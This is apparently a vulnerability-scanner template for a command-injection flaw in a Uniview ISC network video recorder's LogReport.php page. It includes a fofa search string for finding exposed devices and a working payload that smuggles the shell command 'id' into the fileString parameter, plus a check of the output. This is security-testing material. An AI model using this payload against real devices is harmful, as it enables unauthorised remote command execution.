id: uniview-isc-logreport-php-rce

info:
  name: 浙江宇视科技 网络视频录像机 ISC LogReport.php 远程命令执行漏洞
  author: zan8in
  severity: critical
  verified: false
  description: |
    浙江宇视科技 网络视频录像机 ISC /Interface/LogReport/LogReport.php 页面，fileString 参数过滤不严格，导致攻击者可执行任意命令
    fofa: app="uniview-ISC"
  tags: uniview,isc,logreport,php,rce
  created: 2025/03/13
set:
  randstr: randomLowercase(22)
rules:
  r0:
    request:
      method: GET
      path: /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>{{randstr}}.txt
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /Interface/LogReport/{{randstr}}.txt
    expression: response.status == 200 &&  "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
expression: r0() && r1()
